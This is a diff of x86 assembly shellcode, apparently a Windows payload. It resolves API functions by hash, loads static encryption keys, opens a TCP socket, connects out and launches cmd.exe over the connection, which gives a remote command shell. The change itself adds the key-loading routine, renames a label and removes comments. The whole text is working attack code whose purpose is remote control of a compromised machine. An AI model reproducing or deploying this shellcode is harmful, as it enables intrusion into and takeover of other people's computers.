@@ -35,28 +35,35 @@
 main:
 _main:
       pushad 
+      
+      ; allocate memory
       mov    ecx, ds_tbl_size+cs_tbl_size
       sub    esp, ecx      
       mov    edi, esp
       
-      lodsb                        ; eax = number of hashes
+      ; resolve win32 api
+      lodsb
       xchg   eax, ecx
-init_api:                        ; do {
-      lodsd                        ;   get 32-bit hash
-      call   resolve_api              ;   resolve API address
+init_api:          
+      lodsd  
+      call   resolve_api
       test   eax, eax
       jz     exit_init
-      stosd                        ;   save
-      loop   init_api              ; } while (--ecx)
+      stosd
+      loop   init_api
       
-      lea    ebp, [edi+4*4]
+      ; initialize encryption keys
+      call   init_keys
+      %include "static_key.inc"
+init_keys:      
+      pop    esi
+      mov    cl, @ctx
+      lea    edi, [esp+ecx]
+      mov    cl, SPP_CTR_LEN+SPP_EKEY_LEN+SPP_MKEY_LEN
+      rep    movsb
       
-      push   ecx                   ; IPPROTO_IP
-      mov    cl, @len & 255
-      lea    esi, [ebp+ecx]
-      xor    edi, edi
-    
       ; s=socket (AF_INET, SOCK_STREAM, IPPROTO_IP);
+      push   ecx                   ; IPPROTO_IP
       push   1                     ; SOCK_STREAM
       push   2                     ; AF_INET
       xcall  @socket
@@ -76,13 +83,13 @@ init_api:                        ; do {
       xcall  @connect
       pop    ecx
       pop    ecx
-      inc    eax                   ; if (eax==SOCKET_ERROR) goto close_socket;
-      jz     close_socket          
+      inc    eax      ; if (eax==SOCKET_ERROR) goto close_socket;
+      jz     cls_socket          
      
       ; execute cmd.exe
       call   exec_cmd    
  
-close_socket:
+cls_socket:
       ; closesocket (s);
       push   dword [ebp+@s]
       xcall  @closesocket
